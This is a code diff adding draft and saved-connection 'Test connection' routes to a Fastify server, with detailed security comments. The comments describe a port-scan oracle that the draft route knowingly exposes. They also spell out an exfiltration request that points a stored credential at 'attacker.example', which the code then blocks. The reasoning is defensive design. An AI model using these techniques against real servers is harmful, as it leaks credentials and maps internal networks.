@@ -1,10 +1,12 @@
 import { z } from 'zod';
 import type { FastifyPluginAsync } from 'fastify';
 import {
+  ConnectionKindSchema,
   ConnectionPublicSchema,
   NewConnectionSchema,
   canonicalStringify,
   type Connection,
+  type ConnectionProbeResult,
 } from '@autonomy-studio/shared';
 import {
   connectionNotReadyReason,
@@ -20,7 +22,8 @@ import {
 } from '../repo/index.js';
 import { newId } from '../repo/ids.js';
 import { regateTriggersForConnection } from '../run/connection-readiness.js';
-import { encrypt } from '../secrets/secrets.js';
+import { configKeysChangedByOverlay, probeConnection } from '../connectors/probe.js';
+import { SecretDecryptionError, decrypt, encrypt } from '../secrets/secrets.js';
 import { NotFoundError } from '../errors.js';
 import { pageArgsFromQuery, requireOwned } from './util.js';
 import { exportConnection } from '../portability/index.js';
@@ -57,6 +60,27 @@ const ConnectionWriteBodySchema = NewConnectionSchema.omit({
 function toPublic(connection: Connection) {
   return ConnectionPublicSchema.parse(connection);
 }
+
+/**
+ * #1191 — the DRAFT probe body: a config that exists only in the form, with no
+ * row behind it. `kind` is parsed through the shared enum, so an unknown kind is
+ * an honest 400 rather than a sentence about a missing adapter.
+ */
+const ProbeDraftBodySchema = z.object({
+  kind: ConnectionKindSchema,
+  config: z.record(z.string(), z.unknown()),
+  secret: z.string().min(1).optional(),
+});
+
+/**
+ * The SAVED-row probe body — an optional overlay on the stored connection.
+ * Both keys absent means "probe exactly what is stored", which is what the
+ * connections list needs; the edit form sends the config on screen.
+ */
+const ProbeSavedBodySchema = z.object({
+  config: z.record(z.string(), z.unknown()).optional(),
+  secret: z.string().min(1).optional(),
+});
 
 export const connectionsRoutes: FastifyPluginAsync = async (fastify) => {
   const { db, masterKey } = fastify;
@@ -184,6 +208,135 @@ export const connectionsRoutes: FastifyPluginAsync = async (fastify) => {
     });
     if (disabled.length > 0) fastify.scheduler.sync();
     reply.status(204).send();
+  });
+
+  /**
+   * #1191 — probe a DRAFT connection: the "Test connection" button on a form
+   * that has not been saved. Touches no row, writes nothing.
+   *
+   * SECURITY. This lets an authenticated principal make the server open a
+   * socket to a host they name, and read back an adapter sentence that
+   * distinguishes "nothing is listening" from "that host does not resolve" from
+   * "the host did not answer" — i.e. a usable internal-network port-scan oracle,
+   * with no persisted row and no run log behind it.
+   *
+   * That is stated rather than waved away, but it is not a new grant of REACH:
+   * the same principal can already `POST /api/connections` and run a pipeline
+   * against any host, and `auth/principal.ts` stamps one local owner on every
+   * request, so anyone who can reach this port already holds full owner
+   * authority. What the draft route genuinely adds is CONVENIENCE and the
+   * absence of a durable trace — worth an audit seam, which is filed rather
+   * than built here. What bounds it in this fire: `probeConnection`'s
+   * process-wide concurrency cap and its per-probe backstop.
+   */
+  fastify.post('/api/connections/test', async (request) => {
+    const body = ProbeDraftBodySchema.parse(request.body);
+    return probeConnection({
+      registry: fastify.connectors,
+      kind: body.kind,
+      config: body.config,
+      secret: body.secret ?? null,
+    });
+  });
+
+  /**
+   * #1191 — probe a SAVED connection, optionally overlaying the config on
+   * screen. This is the route the EDIT form needs and the draft route cannot
+   * replace: the form's secret input is blank when the operator is keeping the
+   * stored secret, so a draft probe would send no secret and report a FALSE
+   * credential failure for every connection that has one.
+   *
+   * SECURITY — the credential boundary, and the reason this route is not simply
+   * "draft, but with the stored password filled in".
+   *
+   * Reaching the stored plaintext at all is a capability POST-ing a draft does
+   * not have. Combine it with a free-form config overlay and you get an
+   * exfiltration primitive: `{config: {...stored, host: 'attacker.example'}}`
+   * with no `secret` would decrypt this connection's credential and send it
+   * wherever the request body said. For `postgres` that is the password; for
+   * `anthropic_api`, `openai_api` and `http` it is the API key, sent as an auth
+   * header to `config.baseUrl` by their own probes.
+   *
+   * The usual answer — the owner could PATCH those keys anyway — does not hold
+   * here, because a PATCH is a persisted, inspectable mutation that STILL never
+   * reveals the plaintext. Reading a secret out is the one thing no other route
+   * offers, so this is the one route that has to earn it.
+   *
+   * THE RULE IS TOTAL: falling back to the stored secret requires the config to
+   * be EXACTLY as stored. Not "no dangerous key changed" — no key changed.
+   *
+   * The first version of this asked `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS`
+   * which keys were dangerous, and that was a hole, not a subtlety: the table is
+   * empty for the three API-key kinds above, so the guard silently permitted
+   * exactly the exfiltration it was written to stop, for the kinds whose
+   * credential is easiest to spend. An allowlist of dangerous keys is a
+   * standing bet that no adapter will ever grow a new way to send a secret
+   * somewhere, and it fails OPEN. Comparing the whole config cannot.
+   *
+   * The refusal stays narrow where narrowness is free, and each exemption is a
+   * fact about the request rather than a guess about a kind: it does not fire
+   * when the body supplies its own secret (nothing stored is spent), nor when
+   * the connection holds no secret (there is nothing to exfiltrate — which is
+   * what keeps every `fs`/`sqlite` edit probeable), nor when no config overlay
+   * was sent at all. It names the changed keys and the two ways forward rather
+   * than failing blank.
+   */
+  fastify.post<{ Params: { id: string } }>('/api/connections/:id/test', async (request) => {
+    const existing = requireOwned(
+      getConnection(db, request.params.id),
+      request.principal,
+      'connection',
+      request.params.id,
+    );
+    const body = ProbeSavedBodySchema.parse(request.body ?? {});
+    const config = body.config ?? existing.config;
+
+    let secret: string | null = body.secret ?? null;
+    const usingStoredSecret = body.secret === undefined && existing.secretRef !== null;
+    if (usingStoredSecret && body.config !== undefined) {
+      const changed = configKeysChangedByOverlay(existing.config, body.config);
+      if (changed.length > 0) {
+        const result: ConnectionProbeResult = {
+          ok: false,
+          error:
+            `this test would spend the stored secret on settings the saved connection does not have ` +
+            `(${changed.join(', ')} changed) — save the change, or type the secret to test it here`,
+        };
+        return result;
+      }
+    }
+
+    if (usingStoredSecret && existing.secretRef !== null) {
+      const row = getSecretByRef(db, existing.secretRef);
+      // A dangling `secretRef` should be impossible (there is an FK), and this
+      // route is not the place to discover otherwise loudly: `null` is exactly
+      // what "this connection has no usable secret" means, and every
+      // secret-requiring adapter already answers that with its own sentence
+      // (postgres: "this postgres connection has no secret …").
+      if (row) {
+        try {
+          secret = await decrypt(row.ciphertext, masterKey);
+        } catch (err) {
+          // NEVER echo a decrypt error — it can carry ciphertext/key detail.
+          // The executor takes the same posture at its own decrypt.
+          const result: ConnectionProbeResult = {
+            ok: false,
+            error:
+              err instanceof SecretDecryptionError
+                ? "this connection's secret could not be decrypted with the current master key"
+                : "this connection's secret could not be read",
+          };
+          return result;
+        }
+      }
+    }
+
+    return probeConnection({
+      registry: fastify.connectors,
+      kind: existing.kind,
+      config,
+      secret,
+    });
   });
 
   // Version-stamped JSON export (P1c). `exportConnection` does its own
